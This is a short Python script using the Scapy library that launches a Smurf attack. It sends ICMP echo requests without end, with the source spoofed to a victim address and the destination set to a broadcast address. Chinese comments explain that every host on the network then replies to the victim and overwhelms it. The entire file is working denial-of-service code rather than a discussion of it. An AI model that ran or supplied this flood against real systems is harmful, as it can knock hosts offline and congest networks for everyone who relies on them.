# -*- coding:utf-8 -*-
from scapy.all import *
pkt_smurf=IP(src='192.168.1.2',dst='192.168.255.255')/ICMP(type=8)
while True:
	send(pkt_smurf)
  
  
  
  # Smurf攻击是指攻击者向目标网络发送源地址为目标主机地址（被攻击者）、目的地址为目标网络广播地址的ICMP请求报文
  # 目标网络中的所有主机接收到该报文后，都会向目标主机发送ICMP响应报文
  # 导致目标主机收到过多报文而消耗大量资源，甚至导致设备瘫痪或网络阻塞。
